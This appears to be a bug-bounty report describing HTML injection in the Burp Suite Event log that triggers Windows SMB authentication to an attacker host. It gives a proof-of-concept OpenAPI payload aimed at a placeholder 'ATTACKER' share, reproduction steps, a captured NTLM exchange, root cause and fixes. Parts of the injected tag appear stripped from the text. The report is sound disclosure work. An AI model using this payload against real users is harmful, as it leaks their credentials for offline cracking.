title: Burp Suite OpenAPI Event Log HTML injection triggers Windows SMB authentication

profile.name: PortSwigger Web Security
profile.about: Burp Suite is the leading software for web security testing

vulnerability_information: ### Summary Burp Suite 2026.8 build 53343 inserts attacker-controlled text from an OpenAPI parser exception into the Event log HTML without encoding it. After the user invokes **Response → Save OpenAPI requests to site map** and selects the resulting Event log row, Swing's `HTMLEditorKit` interprets an injected `` tag. On Windows, a UNC-backed `file:` URL causes the Burp process to authenticate to an attacker-controlled SMB endpoint. I confirmed the full chain in a controlled Windows 11 environment: NTLM Type 1/2/3 exchange, successful SMB session setup, connection to the selected share, and reads of the selected file. This is not automatic when the response is received; it requires the two UI actions described below. ### Affected version - Burp Suite Professional/Community 2026.8 Early Adopter, build 53343. - Tested artifact: official Windows ARM64 installer `burpsuite_windows-arm64_v2026_8.exe`. - Installer SHA-256: `cda0916433c696eec59c5650c15bc59fdcc4fe1bc04e744f4612653f7b7ea05f`. - Extracted `burpsuite.jar` SHA-256: `1c42cdc7f38f2fb3486a15e1c5212763f81e6e4bc6059776025dd2c093cf94e1`. - Bundled runtime used for testing: Microsoft OpenJDK `25.0.4+7-LTS`, Windows ARM64. - Release page: https://portswigger.net/burp/releases/professional-community-2026-8 ### Proof of concept Serve the following response with HTTP status `200` and `Content-Type: application/json`. Replace `ATTACKER` and `SHARE` with an SMB endpoint and share under your control. ```json { "openapi": "3.0.0", "info": {"title": "t", "version": "1"}, "servers": [{"url": "http://127.0.0.1:9"}], "paths": { "/x": { "post": { "requestBody": { "content": { "application/json": { "schema": { "$ref": "#/components/schemas/http://127.0.0.1:1/>" } } } }, "responses": {"200": {"description": "ok"}} } } } } ``` The ` ` entity is required. A literal space is truncated at this parser-error location, while Swing decodes ` ` as the whitespace between the `img` tag name and its `src` attribute. {F6561285} ### Reproduction steps 1. Start a fresh temporary Burp project on Windows and a controlled SMB listener reachable from that machine. 2. Send a request in Repeater to an endpoint returning the response above. 3. Right-click the Repeater **Response** editor and select **Save OpenAPI requests to site map**. 4. Open **Dashboard → Event log**. 5. Select the new Scanner/Error row for the API-definition parsing failure. 6. Observe the Burp process authenticate to `ATTACKER`, connect to `SHARE`, and request `image.gif`. Using a fresh project avoids Event log deduplication suppressing an equivalent recent event. ### Observed result The controlled live run produced the following sequence: ```text Windows -> listener: NTLM Type 1 listener -> Windows: NTLM Type 2 challenge Windows -> listener: NTLM Type 3, domain=HAKAI, user=burppoc listener -> Windows: SMB2 Session Setup STATUS_SUCCESS listener -> Windows: SMB2 Tree Connect STATUS_SUCCESS Windows -> listener: Create/Read POCSHARE\swing-image.gif ``` The listener returned the exact seven-byte fixture `GIF89a\n`. The bytes read from the SMB response had SHA-256 `3cf815fc3053dafe38db36ef0977b9d027a43bc1ed0d4c5377aa580378bc57f6`, matching the predeclared file. The Type 3 material is omitted from the report. An independent fresh Windows boot using the same product classes, runtime, synthetic credential, and escaped HTML control produced zero `AUTHENTICATE_MESSAGE`, `TreeConnect`, `Create`, or `Read` events. Hashcat mode 5600, with the potfile disabled and only the predeclared synthetic password as a candidate, verified that the positive capture was a valid NetNTLMv2 challenge-response for the controlled account. ### Root cause The build-53343 data flow is: ```text attacker-controlled Repeater response -> OpenAPI validation and full parsing -> raw ApiDefinitionException.getMessage() -> raw Event log detail -> Event log HTML StringBuilder -> JEditorPane.setText() -> Swing ImageView -> Windows file/UNC resolution -> SMB authentication ``` The lightweight OpenAPI gate accepts the response as version `3.0.0`. Full parsing rejects the crafted `$ref` and creates this exception detail: ```text Blocking URL resolution for 'http://127.0.0.1:1/>'. ``` `Zfk4.Ze` passes the raw `ApiDefinitionException.getMessage()` value to the Event log builder. `Zg3w.ZD(false)` appends that detail directly to an HTML `StringBuilder`, and `Zwlk.setText()` renders it as `text/html`. The custom `HTMLEditorKit` view factory replaces paragraph handling but delegates image elements to Swing's standard `ImageView`, which resolves the UNC-backed resource. ### Relationship to report #1054382 / CVE-2021-29416 Public report #1054382 documented the same broad Swing HTML/resource-loading class and Windows credential impact. This report is a current mitigation bypass/regression with a distinct source and viewer: a gate-valid OpenAPI response becomes raw `ApiDefinitionException` detail in the Event log `JEditorPane`. The path remains reachable in official build 53343. Historical report: https://hackerone.com/reports/1054382 ### Preconditions and scope - The user must invoke **Save OpenAPI requests to site map** and then select the resulting Event log row. - The victim must be on Windows, able to reach the SMB endpoint, and have a credential applicable to that target. - Outbound SMB or NTLM policy may prevent authentication. - Proxying, crawling, passive scanning, and active scanning are not claimed as trigger paths. - I do not claim plaintext password disclosure, a reusable NT hash, relay, RCE, or universal impact across every Windows configuration. All testing used owned systems, a read-only controlled share, and synthetic credentials. No third-party credential, host, project, or customer data was accessed. ## Remediation 1. HTML-encode every dynamic Event log value at the final rendering boundary, including `&`, `<`, `>`, quotes, and apostrophes. 2. Disable or replace `ImageView` and any other external-resource view in the Event log `HTMLEditorKit`; Event details should never initiate network or file access. 3. Add regression tests covering entity whitespace and `http:`, `file:`, and UNC-backed resource URLs. ## Impact An attacker controlling an API response can turn a plausible Burp API-import workflow into outbound SMB authentication from the Windows account running Burp. This exposes a NetNTLMv2 challenge-response to the attacker-controlled listener, where it can be subjected to offline password guessing. The controlled test also demonstrated attacker-directed access to the selected SMB share and file path. I assess this as **Medium** because exploitation requires two explicit UI actions, depends on Windows/network credential-release policy, and may be affected by Event log deduplication. No password recovery, reusable NT hash, relay, code execution, or lateral movement is claimed.
